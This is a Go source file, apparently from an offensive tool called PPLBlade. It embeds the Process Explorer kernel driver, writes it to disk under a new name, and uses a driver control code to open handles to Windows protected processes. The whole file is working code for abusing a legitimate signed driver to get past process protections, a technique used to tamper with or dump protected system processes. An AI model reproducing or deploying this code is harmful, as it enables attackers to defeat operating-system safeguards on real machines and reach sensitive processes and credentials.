package main

import (
	_ "embed"
	"golang.org/x/sys/windows"
	"os"
	"unsafe"
)

//go:embed PROCEXP152.SYS
var DRIVER_BYTES []byte

const DIRVER_FILENAME = "PPLBLADE.SYS"

var DRIVER_FULL_PATH, _ = windows.FullPath(DIRVER_FILENAME)

func GetProcExpDriver() (*windows.Handle, error) {
	name, _ := windows.UTF16PtrFromString("\\\\.\\PROCEXP152")
	hDriver, err := windows.CreateFile(name, windows.GENERIC_ALL, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		return nil, CreateError(err)
	}
	return &hDriver, nil
}

func DriverOpenProcess(hDriver windows.Handle, pid int) (*windows.Handle, error) {
	var hProc windows.Handle
	hProcSize := uint32(unsafe.Sizeof(hProc))
	inputBuffLen := uint32(unsafe.Sizeof(pid))
	var bytesReturned uint32
	if err := windows.DeviceIoControl(hDriver, CONTROL_CODE_OPEN_PROTECTED_PROCESS, (*byte)(unsafe.Pointer(&pid)),
		inputBuffLen, (*byte)(unsafe.Pointer(&hProc)), hProcSize, &bytesReturned, nil); err != nil {
		return nil, CreateError(err)
	}
	return &hProc, nil
}

func WriteDriverOnDisk(driverFullPath string) error {
	return CreateError(os.WriteFile(driverFullPath, DRIVER_BYTES, 0644))
}
